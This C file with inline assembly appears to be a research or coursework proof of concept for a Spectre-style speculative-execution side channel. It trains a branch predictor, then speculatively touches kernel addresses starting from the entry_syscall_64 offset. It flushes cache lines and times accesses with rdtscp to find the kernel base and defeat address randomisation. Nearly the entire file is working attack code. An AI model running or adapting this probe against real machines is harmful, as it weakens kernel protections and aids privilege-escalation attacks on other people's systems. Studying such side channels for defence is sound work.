//
// Created by shixinsong on 10/3/23.
//
//
// Created by shixinsong on 10/2/23.
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/syscall.h>

#define START_KERNEL 0xffffffff80000000
#define ALIGN 0x2000000
#define NUM_OFFSETS 32
#define NUM_TRAIN 5

uint64_t sidechannel(uint64_t addr) {
    uint64_t a, b, c, d, out;
    asm volatile (".intel_syntax noprefix;"
                  "mfence;"
                  "rdtscp;"
                  "mov %0, rax;"
                  "mov %1, rdx;"
                  "xor rax, rax;"
                  "lfence;"
                  "mov (%5), %4;"
                  "xor rax, rax;"
                  "lfence;"
                  "rdtscp;"
                  "mov %2, rax;"
                  "mov %3, rdx;"
                  "mfence;"
                  ".att_syntax;"
            : "=r" (a), "=r" (b), "=r" (c), "=r" (d), "=r" (out)
            : "r" (addr)
            : "rax", "rbx", "rcx", "rdx");
    // TODO: Check whether a is overwritten by the second rdtscp!!!
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

char mem[1024] = {0};

int main() {
    char x = 0;
    char cond0[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char cond1[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char cond2[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char cond3[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char cond4[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char cond5[NUM_TRAIN + 1] = {1, 1, 1, 1, 1, 0};
    char *addr[NUM_TRAIN + 1] = {&x, &x, &x, &x, &x, 0};
    int mask = 0;


    uint64_t entry_syscall_64 = 0x600010;
    uint64_t gadget_relative_dist = entry_syscall_64;
    uint64_t scan_start = START_KERNEL + gadget_relative_dist;
    uint64_t data[NUM_OFFSETS] = {0};

    for (uint64_t idx = 0; idx < NUM_OFFSETS; idx++) {
        addr[NUM_TRAIN] = (char *) (scan_start + idx * ALIGN);
        uint64_t time = 0;
        for (uint64_t i = 0; i <= NUM_TRAIN; i++) {
            if (cond0[i] + cond1[i] + cond2[i] + cond3[i] + cond4[i] + cond5[i]) {
                // Speculative access kernel space address when i = NUM_TRAIN
                *(volatile char *) (mem + *(addr[i]) * mask);
            }
            time = sidechannel((uint64_t) mem);
            asm volatile ("clflush (%0)" :: "r"(mem));
            asm volatile ("clflush (%0)" :: "r"(cond0));
            asm volatile ("clflush (%0)" :: "r"(cond1));
            asm volatile ("clflush (%0)" :: "r"(cond2));
            asm volatile ("clflush (%0)" :: "r"(cond3));
            asm volatile ("clflush (%0)" :: "r"(cond4));
            asm volatile ("clflush (%0)" :: "r"(cond5));
        }
        data[idx] += time;
    }

    for (uint64_t i = 0; i < NUM_OFFSETS; i++) {
        printf("%lx %ld\n", scan_start + i * ALIGN, data[i]);
    }
}